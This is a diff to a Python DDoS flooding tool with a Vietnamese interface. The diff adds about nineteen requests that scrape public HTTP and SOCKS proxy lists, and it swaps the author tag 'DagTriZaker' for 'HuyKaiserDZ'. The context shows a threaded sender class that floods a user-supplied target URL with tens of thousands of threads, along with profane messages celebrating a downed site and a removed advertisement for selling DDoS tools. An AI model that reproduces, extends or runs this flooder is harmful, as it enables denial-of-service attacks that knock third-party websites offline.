@@ -10,6 +10,25 @@ def getproxy():
     list = str('proxy.txt')
     rsp = requests.get('https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all')
     rsp = requests.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all')
+    rsp = requests.get('https://api.openproxylist.xyz/socks4.txt')
+    rsp = requests.get('https://www.proxy-list.download/api/v1/get?type=socks4')
+    rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all')
+    rsp = requests.get('https://www.proxy-list.download/api/v1/get?type=http&anon=anonymous')
+    rsp = requests.get('https://www.proxy-list.download/api/v1/get?type=http&anon=elite')
+    rsp = requests.get('http://proxysearcher.sourceforge.net/Proxy%20List.php?type=http')
+    rsp = requests.get('https://www.proxyscan.io/download?type=http')
+    rsp = requests.get('https://api.openproxylist.xyz/socks5.txt')
+    rsp = requests.get('https://www.proxy-list.download/api/v1/get?type=socks5')
+    rsp = requests.get('https://www.freeproxychecker.com/result/socks4_proxies.txt')
+    rsp = requests.get('https://www.proxy-list.download/api/v1/get?type=http&anon=elite&country=US')
+    rsp = requests.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true')
+    rsp = requests.get('https://www.freeproxychecker.com/result/http_proxies.txt')
+    rsp = requests.get('https://proxy-spider.com/api/proxies.example.txt')
+    rsp = requests.get('https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt')
+    rsp = requests.get('https://multiproxy.org/txt_all/proxy.txt')
+    rsp = requests.get('http://rootjazz.com/proxies/proxies.txt')
+    rsp = requests.get('https://api.openproxylist.xyz/http.txt')
+    rsp = requests.get('https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt')
     with open(str(list),'wb') as fp:
         fp.write(rsp.content)    
     pprr = open(list).readlines()
@@ -512,7 +531,7 @@ class sender(threading.Thread):
 
         req = urllib.request.Request(self.url, data, self.headers, self.accept)
         urllib.request.urlopen(req)
-        print(Fore.GREEN+'[DagTriZaker] Connected Website: '+Fore.CYAN+'%s\r\n' % self.url)  
+        print(Fore.GREEN+'[HuyKaiserDZ] Connected Website: '+Fore.CYAN+'%s\r\n' % self.url)  
         
              
         
@@ -523,7 +542,7 @@ class sender(threading.Thread):
             try:
                 self.request()               
             except:
-                sys.stdout.write(Fore.RED+'[DagTriZaker] Connection Website : '+Fore.BLUE+'ĐỊT CỤ WEBSITE LỎ VÃI LỒN DOWN DOWN DOWN CHẾT MẸ ĐI !!\n') 
+                sys.stdout.write(Fore.RED+'[HuyKaiserDZ] Connection Website : '+Fore.BLUE+'ĐỊT CỤ WEBSITE LỎ VÃI LỒN DOWN DOWN DOWN CHẾT MẸ ĐI !!\n') 
                 sys.exit(0)
 
         sys.exit(0)
@@ -543,7 +562,6 @@ class MainLoop:
                                                            
 --------------------------------------------------------------------------------------------------- 
  Cảm ơn bạn đã ủng hộ DagTri nhiều nha <3 love u very much
- Contact me :  BUY TOOL DDOS IB: Fb.com/dangtriofficial.3107 | GITHUB : DagTriZaker
                                                                                                   
                                                                                                   
                                                                                              
@@ -557,7 +575,7 @@ class MainLoop:
 			#url = sys.argv[1]
             os.system('cls' if os.name == 'nt' else 'clear')
             print(CRED2 + logo + CRED2)
-            url = str(input(f"{Fore.RED}[DagTriZaker]   Nhập Url/Target: {Fore.RESET}"))
+            url = str(input(f"{Fore.RED}[HuyKaiserDZ]   Nhập Url/Target: {Fore.RESET}"))
         except:
             os.system('cls' if os.name == 'nt' else 'clear')
 			#url = sys.argv[1]
@@ -572,7 +590,7 @@ class MainLoop:
             else:
 				#num_threads = sys.argv[2]
                 #num_threads = int(input("threads: "))
-                num_threads = str(input(f"{Fore.RED}[DagTriZaker]   Threads (100000): {Fore.RESET}"))
+                num_threads = str(input(f"{Fore.RED}[HuyKaiserDZ]   Threads (100000): {Fore.RESET}"))
                 if num_threads == '':
                     #num_threads = int(8000)
                      num_threads = int(random.randint(20000, 30000))
